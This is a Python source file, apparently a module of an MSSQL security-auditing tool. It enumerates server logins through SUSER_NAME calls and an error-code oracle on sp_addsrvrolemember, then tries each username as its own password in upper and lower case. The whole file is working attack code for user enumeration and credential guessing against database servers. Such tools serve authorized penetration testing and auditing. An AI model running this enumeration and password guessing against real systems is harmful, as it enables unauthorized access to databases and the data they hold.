
#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging
from Mssql import Mssql
from Utils import checkOptionsGivenByTheUser, getCredentialsFormated
from Constants import *
from PasswordGuesser import PasswordGuesser, runPasswordGuesserModule

class UsernameLikePassword (Mssql):
	'''
	Allow to connect to the database using each MSSQL username like the password 
	'''
	
	#Constants
	REQ_IS_A_VALID_USERNAME = "sp_addsrvrolemember '{0}','HDHEIHIUDHLZGHDUGZDZIUHDZYUG'" #{0} username
	REQ_GET_USERNAME = "SELECT {0}" #{0} server_user_id list SUSER_NAME(number)
	ERROR_INVALID_LOGIN = "15007"
	ERROR_INVALID_ROLE = "15402"
	ERROR_VALID_LOGIN = "15151"
	
	def __init__(self,args, lowerAndUpper=True):
		'''
		Constructor
		'''
		logging.debug("UsernameLikePassword object created")
		Mssql.__init__(self,args)
		self.allUsernames = []
		self.validAccountsList = []
		self.lowerAndUpper=lowerAndUpper
		
	def getUsernamesViaSuserName(self):
		'''
		Steal logins with SUSER_NAME method
		Return user list or None if impossible
		Returns Exception or None if error
		'''
		logging.info ("Stealing MSSQL users thanks to the SUSER_NAME function...")
		validUsers, selectData, selectAttr = [], [], []
		if self.isThe2008Version() or self.isThe2012Version() or self.isThe2014Version() or self.isThe2016Version() or self.isThe2017Version() or self.isThe2019Version():
			logging.debug ("The current version of MSSQL implements the SUSER_NAME function")
			for aServerUserId in range (NB_SERVER_USER_ID_MAX):
				selectData.append("SUSER_NAME({0})".format(aServerUserId+1))
			data = self.executeRequest(self.REQ_GET_USERNAME.format(",".join(selectData)))
			if isinstance(data,Exception): 
				return data
			else:
				for i in range (NB_SERVER_USER_ID_MAX):
					username = data[0][i]
					if username == None:
						pass
					else:
						data2 = self.executeRequest(self.REQ_IS_A_VALID_USERNAME.format(username))
						if isinstance(data2,Exception): 
							if self.ERROR_INVALID_LOGIN in str(data2) or self.ERROR_INVALID_ROLE in str(data2):
								pass
							elif self.ERROR_VALID_LOGIN in str(data2):
								logging.debug("The user '{0}' is valid, continue...".format(username))
								validUsers.append(username)
							else:
								logging.warning ("Impossible to know if the username '{0}' is valid. Error unknown: '{1}'".format(username,data2))
			return validUsers
		else :
			logging.info ("The function SUSER_NAME doesn't exist in this version of MSSQL ('{0}'). Applies to: SQL Server 2008 through current version".format(self.getCompleteVersion()))
			return None

	def __loadAllUsernames__(self):
		'''
		Get all usernames from the syslogins table or through SUSER_NAME method
		Return True if ok, otherwise returns Exception
		'''
		logging.info('Get all usernames from the SUSER_NAME method')
		usernames = self.getUsernamesViaSuserName()
		if isinstance(usernames,Exception) or usernames==None:
			logging.info('Impossible to get usernames with SUSER_NAME method: {0}'.format(str(usernames)))
			allUsernames = self.getUsernamesViaSyslogins()
			if isinstance(allUsernames,Exception):
				self.allUsernames = []
				return allUsernames
			else:
				self.allUsernames = allUsernames
			logging.info("MSSQL usernames stored in the master..syslogins table: {0}".format(self.allUsernames))
		else:
			self.allUsernames = usernames
		return True
		

	def tryUsernameLikePassword(self):
		'''
		Try to connect to the DB with each Oracle username using the username like the password
		if lowerAndUpper == True, the username in upper case and lower case format will be tested
		Otherwise identical to username only
		'''
		accounts = []
		self.__loadAllUsernames__()
		passwordGuesser = PasswordGuesser(self.args,accountsFile="",usernamesFile=None,passwordsFile=None)
		for usern in self.allUsernames:
			if self.lowerAndUpper == True:
				logging.debug("Password identical (upper case and lower case) to username will be tested for '{0}'".format(usern))
				accounts.append([usern,usern.upper()])
				accounts.append([usern,usern.lower()])
			else:
				logging.debug("Password identical to username will be tested ONLY for '{0}' (option enabled)".format(usern))
				accounts.append([usern,usern])
		passwordGuesser.accounts = accounts
		passwordGuesser.searchValideAccounts()
		self.validAccountsList = passwordGuesser.valideAccounts	

	def testAll (self):
		'''
		Test all functions
		'''
		pass

def runUsernameLikePassword(args):
	'''
	Run the UsernameLikePassword module
	'''
	status= True
	usernameLikePassword = UsernameLikePassword(args)
	status = usernameLikePassword.connect(stopIfError=True)
	#Option 1: UsernameLikePassword
	if args['run'] !=None :
		args['print'].title("MSSQL users have not the password identical to the username ?")
		usernameLikePassword.tryUsernameLikePassword()
		if usernameLikePassword.validAccountsList == {}:
			args['print'].badNews("No found a valid account on {0}:{1} in UsernameLikePassword module".format(args['host'], args['port']))
		else :
			args['print'].goodNews("Accounts found on {0}:{1}: {2}".format(args['host'], args['port'],getCredentialsFormated(usernameLikePassword.validAccountsList)))


